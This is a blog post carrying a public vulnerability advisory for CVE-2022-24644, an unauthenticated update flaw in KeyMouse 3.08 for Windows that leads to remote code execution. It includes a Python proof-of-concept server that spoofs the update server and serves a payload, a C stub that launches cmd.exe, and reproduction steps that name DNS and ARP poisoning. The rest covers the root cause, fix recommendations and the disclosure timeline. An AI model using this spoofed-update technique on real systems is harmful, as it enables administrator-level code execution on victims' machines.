<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>CVE-2022-24644 | Gar Reversing</title>
<meta name=keywords content="cwe_494,public_release">
<meta name=description content="ZZ Inc. KeyMouse 3.08 (Windows) Unauthenticated Update Remote Code Execution Vulnerability (PDF)">
<meta name=author content="Gary">
<link rel=canonical href=https://gar-re.github.io/posts/cve-2022-24644/>
<meta name=google-site-verification content="XYZabc">
<meta name=yandex-verification content="XYZabc">
<meta name=msvalidate.01 content="XYZabc">
<link crossorigin=anonymous href=/assets/css/stylesheet.319f7209271a6127ecb9f000084aa4ce7f5f4394f5ef702b9cbb0f5bdd4523de.css integrity="sha256-MZ9yCScaYSfsufAACEqkzn9fQ5T173ArnLsPW91FI94=" rel="preload stylesheet" as=style>
<script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://gar-re.github.io/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://gar-re.github.io/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://gar-re.github.io/favicon-32x32.png>
<link rel=apple-touch-icon href=https://gar-re.github.io/apple-touch-icon.png>
<link rel=mask-icon href=https://gar-re.github.io/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<noscript>
<style>#theme-toggle,.top-link{display:none}</style>
</noscript><meta property="og:title" content="CVE-2022-24644">
<meta property="og:description" content="ZZ Inc. KeyMouse 3.08 (Windows) Unauthenticated Update Remote Code Execution Vulnerability (PDF)">
<meta property="og:type" content="article">
<meta property="og:url" content="https://gar-re.github.io/posts/cve-2022-24644/">
<meta property="og:image" content="https://gar-re.github.io/posts/cve-2022-24644/cover.png"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2022-03-04T00:00:00+00:00">
<meta property="article:modified_time" content="2022-03-04T00:00:00+00:00"><meta property="og:site_name" content="Gar Reversing">
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="https://gar-re.github.io/posts/cve-2022-24644/cover.png">
<meta name=twitter:title content="CVE-2022-24644">
<meta name=twitter:description content="ZZ Inc. KeyMouse 3.08 (Windows) Unauthenticated Update Remote Code Execution Vulnerability (PDF)">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://gar-re.github.io/posts/"},{"@type":"ListItem","position":2,"name":"CVE-2022-24644","item":"https://gar-re.github.io/posts/cve-2022-24644/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"CVE-2022-24644","name":"CVE-2022-24644","description":"ZZ Inc. KeyMouse 3.08 (Windows) Unauthenticated Update Remote Code Execution Vulnerability (PDF)\n","keywords":["cwe_494","public_release"],"articleBody":"ZZ Inc. KeyMouse 3.08 (Windows) Unauthenticated Update Remote Code Execution Vulnerability (PDF)\nAdvisory Information  Title: ZZ Inc. KeyMouse 3.08 (Windows) Unauthenticated Update Remote Code Execution Vulnerability Vendors contacted: ZZ, Inc. Release mode: Public Release  Vulnerability Information  Class: Download of Code Without Integrity Check [CWE-494] Affected Product: KeyMouse Windows 3.08 (prior versions 2.02 and 3.05 are also affected) Remotely Exploitable: Yes Locally Exploitable: Yes Severity: High - 8.8 (CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H) CVE Identifier: CVE-2022-24644  High-level overview This vulnerability allows remote attackers to execute arbitrary code on the affected installations of ZZ Inc. KeyMouse. A man-in-the-middle position is required to exploit this vulnerability.\nThe specific flaw exists in the update procedure of KeyMouse. The process does not authenticate its update server. An attacker can spoof this update server and leverage this vulnerability to execute code in the context of an Administrator at high integrity.\nRoot Cause Analysis An update can be triggered manually through the application menu or tray bar.\nThe update requests http://www.keymouse.com/downloads/windows/versions.txt. As we can see from the screenshot, the update server redirects to a location using TLS (HTTPS).\nThe update configuration https://www.keymouse.com/downloads/windows/versions.txt contains:\n{ \"version\": \"3.05\", \"file\": \"keymouse-setup3.05.exe\", \"history\": \"3.05 - Fix bug when saving to KeyMouse Track \u0026 Alpha as a set.\\r\\n3.04 - Fix bugs on Linux not writing to the devices correctly.\\r\\n3.03 - Fix bug in copying layouts from presets to custom layouts (symbols or keys with modifiers weren't copying right). Fix bug left\\/right scroll were swapped.\\r\\n3.02 - Fix bug in importing of V2 file formats. Fix setup to default install to different folder than previous versions.\\r\\n3.01 - Update to allow the software to load V2 Layout files. Saves as V3 layouts files. Various updates to new keyset format.\\r\\n3.00 - Switch to software for the new PCB. Not backwards compatible. Use 2.xx or newer for previous KeyMouse PCBs.\\r\\n2.50 - Previous KeyMouse Software for Older PCBs.\" } This requested JSON update configuration contains a version number to update to in version, if this is higher than its current version file is read from the configuration and the update binary at http://www.keymouse.com/downloads/windows/ is requested.\nFollowing the update,  is automatically executed at high integrity.\nProof-of-Concept The below script is used as a proof of concept.\n#!/usr/bin/env python3 # PoC script for ZZ Inc. KeyMouse 3.08 (Windows) Unauthenticated Update Remote Code Execution Vulnerability # See report for details. # # Author: Gerr.re from http.server import BaseHTTPRequestHandler, HTTPServer version_txt = b'''{ \"version\": \"4.00\", \"file\": \"proof.exe\", \"history\": \"4.00 - Vulnerable Update Procedure\\r\\nRecommend using TLS/HTTPS\\r\\nRecommend checking signature of binary.\" } ''' class HTTPHandler(BaseHTTPRequestHandler): def do_GET(self): if \"versions.txt\" in self.path or \"version.txt\" in self.path: self.send_response(200) self.end_headers() self.wfile.write(version_txt) elif \"proof.exe\" in self.path: self.send_response(200) self.end_headers() with open(\"proof.exe\", \"rb\") as f: self.wfile.write(f.read()) else: self.send_response(404) self.end_headers() if __name__ == \"__main__\": webserver = HTTPServer((\"0.0.0.0\", 80), HTTPHandler) print(\"Running Server\") try: webserver.serve_forever() except KeyboardInterrupt: pass webserver.server_close() Testsetup This proof-of-concept was tested on target Windows 10 21H2 with ZZ Inc. KeyMouse 3.08 installed, and attacker Ubuntu 20.04.3 LTS.\nSteps to reproduce  Install KeyMouse Windows 3.08; Set spoof www.keymouse.com to our attacker ip;  For the proof-of-concept it is easiest to edit c:\\windows\\system32\\drivers\\etc\\hosts on the target.  Attackers may e.g. use:  poorly configured routers/switches/DNS DNS cache poisoning ARP cache poisoning       Compile proof.c on the attacker, e.g. using i686-w64-mingw32-gcc proof.c -o proof.exe;  #include int main(int argc, char const *argv[]){\tWinExec(\"cmd.exe\",1); return TRUE; } Run the proof-of-concept script on the attacker; Start KeyMouse on the target and trigger an update:  Application Menu: Help - Check For Updates Task Bar: right mouse button on task bar icon - Check Updates (or Install Updates1)   Continue with the update.  As a result, proof.exe is executed in the context of the Administrator user at high integrity.\nRecommendations The vulnerability presents itself because there is insufficient authentication from the update server.\nWe recommend KeyMouse to release a fix to the issue:\n the updater must use TLS/HTTPS for requests and must drop request for which the TLS certificate is untrusted; the updater must check the signature of the update binary.  We recommend users to sinkhole the www.keymouse.com domain until a fix is available:\n Open c:\\windows\\system32\\drivers\\etc\\hosts in a text editor with Administrator privileges. Add the following line at the end of the file:  0.0.0.0 www.keymouse.com Report Timeline  24-12-2021: Initial contact with the vendor via support@keymouse.com. 11-01-2022: KeyMouse releases 3.07 which is not vulnerable. 14-01-2022: Gerr.re sent reminder to support@keymouse.com after no response. 20-01-2022: KeyMouse releases 3.08 which is vulnerable again. 04-02-2022: Gerr.re sent a request to Mitre for a CVE ID. 07-02-2022: KeyMouse releases 3.09 BETA which is also vulnerable. 11-02-2022: Gerr.re sent final reminder to support@keymouse.com after no response. 11-02-2022: Gerr.re posts privately on KeyMouse support forum to catch attention. 11-02-2022: KeyMouse sent a single word reply: “stop”. 11-02-2022: Gerr.re recommends to continue coordinated disclosure. 15-02-2022: KeyMouse replies, underestimating severity/impact. 16-02-2022: Gerr.re sent draft report of public advisory and recommends patching/updating the vulnerability. 04-03-2022: Public release due to no response from KeyMouse.  Disclaimer The contents of this advisory are copyright © 2022 Gerr.re, and are licensed under a Creative Commons Attribution-NoDerivatives 4.0 International (CC BY-ND 4.0)\n  Note: KeyMouse automatically checks for updates. When a newer version is found, a Windows notification is shown and the title bar of the application mentions “Update Available” ↩︎\n  ","wordCount":"858","inLanguage":"en","image":"https://gar-re.github.io/posts/cve-2022-24644/cover.png","datePublished":"2022-03-04T00:00:00Z","dateModified":"2022-03-04T00:00:00Z","author":{"@type":"Person","name":"Gary"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://gar-re.github.io/posts/cve-2022-24644/"},"publisher":{"@type":"Organization","name":"Gar Reversing","logo":{"@type":"ImageObject","url":"https://gar-re.github.io/favicon.ico"}}}</script>
</head>
<body class=dark id=top>
<script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove('dark')</script>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=https://gar-re.github.io/ accesskey=h title="Gar Reversing (Alt + H)">
<img src=https://gar-re.github.io/gar-re_logo.png alt aria-label=logo height=35>Gar Reversing</a>
<div class=logo-switches>
<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
</div>
</div>
<ul id=menu>
<li>
<a href=https://gar-re.github.io/contact/ title=Contact>
<span>Contact</span>
</a>
</li>
<li>
<a href=https://gar-re.github.io/disclosure-policy/ title="Disclosure Policy">
<span>Disclosure Policy</span>
</a>
</li>
<li>
<a href=https://gar-re.github.io/archives/ title=Archive>
<span>Archive</span>
</a>
</li>
<li>
<a href=https://gar-re.github.io/tags/ title=Tags>
<span>Tags</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<h1 class=post-title>
CVE-2022-24644
</h1>
<div class=post-meta><span title="2022-03-04 00:00:00 +0000 UTC">March 4, 2022</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;Gary
</div>
</header>
<figure class=entry-cover>
<img loading=lazy srcset="https://gar-re.github.io/posts/cve-2022-24644/cover_hu44887df9af0439dbc18d862085fa795f_407807_360x0_resize_box_3.png 360w ,https://gar-re.github.io/posts/cve-2022-24644/cover_hu44887df9af0439dbc18d862085fa795f_407807_480x0_resize_box_3.png 480w ,https://gar-re.github.io/posts/cve-2022-24644/cover_hu44887df9af0439dbc18d862085fa795f_407807_720x0_resize_box_3.png 720w ,https://gar-re.github.io/posts/cve-2022-24644/cover_hu44887df9af0439dbc18d862085fa795f_407807_1080x0_resize_box_3.png 1080w ,https://gar-re.github.io/posts/cve-2022-24644/cover_hu44887df9af0439dbc18d862085fa795f_407807_1500x0_resize_box_3.png 1500w ,https://gar-re.github.io/posts/cve-2022-24644/cover.png 2680w" sizes="(min-width: 768px) 720px, 100vw" src=https://gar-re.github.io/posts/cve-2022-24644/cover.png alt width=2680 height=560>
</figure><div class=toc>
<details>
<summary accesskey=c title="(Alt + C)">
<span class=details>Table of Contents</span>
</summary>
<div class=inner><ul>
<li>
<a href=#advisory-information aria-label="Advisory Information">Advisory Information</a></li>
<li>
<a href=#vulnerability-information aria-label="Vulnerability Information">Vulnerability Information</a></li>
<li>
<a href=#high-level-overview aria-label="High-level overview">High-level overview</a></li>
<li>
<a href=#root-cause-analysis aria-label="Root Cause Analysis">Root Cause Analysis</a></li>
<li>
<a href=#proof-of-concept aria-label=Proof-of-Concept>Proof-of-Concept</a><ul>
<li>
<a href=#testsetup aria-label=Testsetup>Testsetup</a></li>
<li>
<a href=#steps-to-reproduce aria-label="Steps to reproduce">Steps to reproduce</a></li></ul>
</li>
<li>
<a href=#recommendations aria-label=Recommendations>Recommendations</a></li>
<li>
<a href=#report-timeline aria-label="Report Timeline">Report Timeline</a></li>
<li>
<a href=#disclaimer aria-label=Disclaimer>Disclaimer</a>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content><p>ZZ Inc. KeyMouse 3.08 (Windows) Unauthenticated Update Remote Code Execution Vulnerability (<a href=https://github.com/gar-re/cve-2022-24644/blob/main/cve-2022-24644_public-advisory.pdf>PDF</a>)</p>
<h1 id=advisory-information>Advisory Information<a hidden class=anchor aria-hidden=true href=#advisory-information>#</a></h1>
<ul>
<li><strong>Title:</strong> ZZ Inc. KeyMouse 3.08 (Windows) Unauthenticated Update Remote Code Execution Vulnerability</li>
<li><strong>Vendors contacted:</strong> <a href=https://www.zzinc.com>ZZ, Inc.</a></li>
<li><strong>Release mode:</strong> Public Release</li>
</ul>
<h1 id=vulnerability-information>Vulnerability Information<a hidden class=anchor aria-hidden=true href=#vulnerability-information>#</a></h1>
<ul>
<li><strong>Class:</strong> Download of Code Without Integrity Check <a href=https://cwe.mitre.org/data/definitions/494.html>[CWE-494]</a></li>
<li><strong>Affected Product:</strong> <a href=https://www.keymouse.com>KeyMouse</a> Windows 3.08 (prior versions 2.02 and 3.05 are also affected)</li>
<li><strong>Remotely Exploitable:</strong> Yes</li>
<li><strong>Locally Exploitable:</strong> Yes</li>
<li><strong>Severity:</strong> High - 8.8 <a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:A/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H&version=3.1">(CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H)</a></li>
<li><strong>CVE Identifier:</strong> <a href=https://nvd.nist.gov/vuln/detail/CVE-2022-24644>CVE-2022-24644</a></li>
</ul>
<h1 id=high-level-overview>High-level overview<a hidden class=anchor aria-hidden=true href=#high-level-overview>#</a></h1>
<p>This vulnerability allows remote attackers to execute arbitrary code on the affected installations of ZZ Inc. KeyMouse.
A man-in-the-middle position is required to exploit this vulnerability.</p>
<p>The specific flaw exists in the update procedure of KeyMouse.
The process does not authenticate its update server.
An attacker can spoof this update server and leverage this vulnerability to execute code in the context of an Administrator at high integrity.</p>
<h1 id=root-cause-analysis>Root Cause Analysis<a hidden class=anchor aria-hidden=true href=#root-cause-analysis>#</a></h1>
<p>An update can be triggered manually through the application menu or tray bar.</p>
<p>The update requests <code>http://www.keymouse.com/downloads/windows/versions.txt</code>.
As we can see from the screenshot, the update server redirects to a location using TLS (HTTPS).</p>
<p><p align=center>
<img loading=lazy src=initialrequest.jpg alt="Update request and response">
</p>
</p>
<p>The update configuration <code>https://www.keymouse.com/downloads/windows/versions.txt</code> contains:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
  <span style=color:#f92672>&#34;version&#34;</span>: <span style=color:#e6db74>&#34;3.05&#34;</span>,
  <span style=color:#f92672>&#34;file&#34;</span>: <span style=color:#e6db74>&#34;keymouse-setup3.05.exe&#34;</span>,
  <span style=color:#f92672>&#34;history&#34;</span>: <span style=color:#e6db74>&#34;3.05 - Fix bug when saving to KeyMouse Track &amp; Alpha as a set.\r\n3.04 - Fix bugs on Linux not writing to the devices correctly.\r\n3.03 - Fix bug in copying layouts from presets to custom layouts (symbols or keys with modifiers weren&#39;t copying right).  Fix bug left\/right scroll were swapped.\r\n3.02 - Fix bug in importing of V2 file formats.  Fix setup to default install to different folder than previous versions.\r\n3.01 - Update to allow the software to load V2 Layout files.  Saves as V3 layouts files.  Various updates to new keyset format.\r\n3.00 - Switch to software for the new PCB.  Not backwards compatible.  Use 2.xx or newer for previous KeyMouse PCBs.\r\n2.50 - Previous KeyMouse Software for Older PCBs.&#34;</span>
}
</code></pre></div><p>This requested JSON update configuration contains a version number to update to in <code>version</code>, if this is higher than its current version <code>file</code> is read from the configuration and the update binary at <code>http://www.keymouse.com/downloads/windows/&lt;file></code> is requested.</p>
<p>Following the update, <code>&lt;file></code> is automatically executed at high integrity.</p>
<h1 id=proof-of-concept>Proof-of-Concept<a hidden class=anchor aria-hidden=true href=#proof-of-concept>#</a></h1>
<p>The below script is used as a proof of concept.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/env python3</span>
<span style=color:#75715e># PoC script for ZZ Inc. KeyMouse 3.08 (Windows) Unauthenticated Update Remote Code Execution Vulnerability</span>
<span style=color:#75715e># See report for details.</span>
<span style=color:#75715e>#</span>
<span style=color:#75715e># Author: Gerr.re</span>
<span style=color:#f92672>from</span> http.server <span style=color:#f92672>import</span> BaseHTTPRequestHandler, HTTPServer

version_txt <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&#39;&#39;{
</span><span style=color:#e6db74>&#34;version&#34;: &#34;4.00&#34;,
</span><span style=color:#e6db74>&#34;file&#34;: &#34;proof.exe&#34;,
</span><span style=color:#e6db74>&#34;history&#34;: &#34;4.00 - Vulnerable Update Procedure</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>Recommend using TLS/HTTPS</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>Recommend checking signature of binary.&#34;
</span><span style=color:#e6db74>}
</span><span style=color:#e6db74>&#39;&#39;&#39;</span>

<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>HTTPHandler</span>(BaseHTTPRequestHandler):
    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>do_GET</span>(self):
        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;versions.txt&#34;</span> <span style=color:#f92672>in</span> self<span style=color:#f92672>.</span>path <span style=color:#f92672>or</span> <span style=color:#e6db74>&#34;version.txt&#34;</span> <span style=color:#f92672>in</span> self<span style=color:#f92672>.</span>path:
            self<span style=color:#f92672>.</span>send_response(<span style=color:#ae81ff>200</span>)
            self<span style=color:#f92672>.</span>end_headers()
            self<span style=color:#f92672>.</span>wfile<span style=color:#f92672>.</span>write(version_txt)
        <span style=color:#66d9ef>elif</span> <span style=color:#e6db74>&#34;proof.exe&#34;</span> <span style=color:#f92672>in</span> self<span style=color:#f92672>.</span>path:
            self<span style=color:#f92672>.</span>send_response(<span style=color:#ae81ff>200</span>)
            self<span style=color:#f92672>.</span>end_headers()
            <span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#34;proof.exe&#34;</span>, <span style=color:#e6db74>&#34;rb&#34;</span>) <span style=color:#66d9ef>as</span> f:
                self<span style=color:#f92672>.</span>wfile<span style=color:#f92672>.</span>write(f<span style=color:#f92672>.</span>read())
        <span style=color:#66d9ef>else</span>:
            self<span style=color:#f92672>.</span>send_response(<span style=color:#ae81ff>404</span>)
            self<span style=color:#f92672>.</span>end_headers()

<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
    webserver <span style=color:#f92672>=</span> HTTPServer((<span style=color:#e6db74>&#34;0.0.0.0&#34;</span>, <span style=color:#ae81ff>80</span>), HTTPHandler)

    print(<span style=color:#e6db74>&#34;Running Server&#34;</span>)
    <span style=color:#66d9ef>try</span>:
        webserver<span style=color:#f92672>.</span>serve_forever()
    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>KeyboardInterrupt</span>:
        <span style=color:#66d9ef>pass</span>

    webserver<span style=color:#f92672>.</span>server_close()
</code></pre></div><h2 id=testsetup>Testsetup<a hidden class=anchor aria-hidden=true href=#testsetup>#</a></h2>
<p>This proof-of-concept was tested on target Windows 10 21H2 with ZZ Inc. KeyMouse 3.08 installed, and attacker Ubuntu 20.04.3 LTS.</p>
<h2 id=steps-to-reproduce>Steps to reproduce<a hidden class=anchor aria-hidden=true href=#steps-to-reproduce>#</a></h2>
<ol>
<li>Install <a href=http://www.keymouse.com/downloads/windows/keymouse-setup3.08.exe>KeyMouse Windows 3.08</a>;</li>
<li>Set spoof <code>www.keymouse.com</code> to our attacker ip;
<ul>
<li>For the proof-of-concept it is easiest to edit <code>c:\windows\system32\drivers\etc\hosts</code> on the target.
<ul>
<li>Attackers may e.g. use:
<ul>
<li>poorly configured routers/switches/DNS</li>
<li>DNS cache poisoning</li>
<li>ARP cache poisoning</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Compile <code>proof.c</code> on the attacker, e.g. using <code>i686-w64-mingw32-gcc proof.c -o proof.exe</code>;</li>
</ol>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;windows.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#66d9ef>const</span> <span style=color:#f92672>*</span>argv[]){	
	WinExec(<span style=color:#e6db74>&#34;cmd.exe&#34;</span>,<span style=color:#ae81ff>1</span>);
	<span style=color:#66d9ef>return</span> TRUE;
}
</code></pre></div><ol start=4>
<li>Run the proof-of-concept script on the attacker;</li>
<li>Start KeyMouse on the target and trigger an update:
<ul>
<li>Application Menu: Help -> Check For Updates</li>
<li>Task Bar: right mouse button on task bar icon -> Check Updates (or Install Updates<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>)</li>
</ul>
</li>
<li>Continue with the update.</li>
</ol>
<p>As a result, <code>proof.exe</code> is executed in the context of the Administrator user at high integrity.</p>
<p><p align=center>
<img loading=lazy src=proof.jpg alt="proof.exe executed as Administrator at High Mandatory Level">
</p>
</p>
<h1 id=recommendations>Recommendations<a hidden class=anchor aria-hidden=true href=#recommendations>#</a></h1>
<p>The vulnerability presents itself because there is insufficient authentication from the update server.</p>
<p>We recommend KeyMouse to release a fix to the issue:</p>
<ul>
<li>the updater must use TLS/HTTPS for requests and must drop request for which the TLS certificate is untrusted;</li>
<li>the updater must check the signature of the update binary.</li>
</ul>
<p>We recommend users to sinkhole the <code>www.keymouse.com</code> domain until a fix is available:</p>
<ol>
<li>Open <code>c:\windows\system32\drivers\etc\hosts</code> in a text editor with Administrator privileges.</li>
<li>Add the following line at the end of the file:</li>
</ol>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>0.0.0.0  www.keymouse.com
</code></pre></div><h1 id=report-timeline>Report Timeline<a hidden class=anchor aria-hidden=true href=#report-timeline>#</a></h1>
<ul>
<li><strong>24-12-2021:</strong> Initial contact with the vendor via <a href=mailto:support@keymouse.com>support@keymouse.com</a>.</li>
<li><strong>11-01-2022:</strong> KeyMouse releases 3.07 which is not vulnerable.</li>
<li><strong>14-01-2022:</strong> Gerr.re sent reminder to <a href=mailto:support@keymouse.com>support@keymouse.com</a> after no response.</li>
<li><strong>20-01-2022:</strong> KeyMouse releases 3.08 which is vulnerable again.</li>
<li><strong>04-02-2022:</strong> Gerr.re sent a request to Mitre for a CVE ID.</li>
<li><strong>07-02-2022:</strong> KeyMouse releases 3.09 BETA which is also vulnerable.</li>
<li><strong>11-02-2022:</strong> Gerr.re sent final reminder to <a href=mailto:support@keymouse.com>support@keymouse.com</a> after no response.</li>
<li><strong>11-02-2022:</strong> Gerr.re posts privately on KeyMouse support forum to catch attention.</li>
<li><strong>11-02-2022:</strong> KeyMouse sent a single word reply: &ldquo;stop&rdquo;.</li>
<li><strong>11-02-2022:</strong> Gerr.re recommends to continue coordinated disclosure.</li>
<li><strong>15-02-2022:</strong> KeyMouse replies, underestimating severity/impact.</li>
<li><strong>16-02-2022:</strong> Gerr.re sent draft report of public advisory and recommends patching/updating the vulnerability.</li>
<li><strong>04-03-2022:</strong> Public release due to no response from KeyMouse.</li>
</ul>
<h1 id=disclaimer>Disclaimer<a hidden class=anchor aria-hidden=true href=#disclaimer>#</a></h1>
<p>The contents of this advisory are copyright © 2022 Gerr.re, and are licensed under a Creative Commons Attribution-NoDerivatives 4.0 International (<a href=https://creativecommons.org/licenses/by-nd/4.0/>CC BY-ND 4.0</a>)</p>
<section class=footnotes role=doc-endnotes>
<hr>
<ol>
<li id=fn:1 role=doc-endnote>
<p>Note: KeyMouse automatically checks for updates. When a newer version is found, a Windows notification is shown and the title bar of the application mentions &ldquo;Update Available&rdquo;&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p>
</li>
</ol>
</section>
</div>
<footer class=post-footer>
<ul class=post-tags>
<li><a href=https://gar-re.github.io/tags/cwe_494/>cwe_494</a></li>
<li><a href=https://gar-re.github.io/tags/public_release/>public_release</a></li>
</ul>
<div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share CVE-2022-24644 on twitter" href="https://x.com/intent/tweet/?text=CVE-2022-24644&url=https%3a%2f%2fgar-re.github.io%2fposts%2fcve-2022-24644%2f&hashtags=cwe_494%2cpublic_release"><svg id="svg5" xmlns:svg="http://www.w3.org/2000/svg" height="30" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 1250 1150" fill="currentcolor"><path id="path1009" d="M283.94 167.31l386.39 516.64L281.5 1104h87.51l340.42-367.76L984.48 1104h297.8L874.15 558.3l361.92-390.99h-87.51l-313.51 338.7-253.31-338.7H283.94zm128.69 64.46h136.81l604.13 807.76h-136.81L412.63 231.77z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>&copy; 2025 <a href=https://gar-re.github.io/>Gar Reversing</a></span>
</footer>
<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a>
<script>let menu=document.getElementById('menu');menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerHTML='copy';function d(){a.innerHTML='copied!',setTimeout(()=>{a.innerHTML='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
</body>
</html>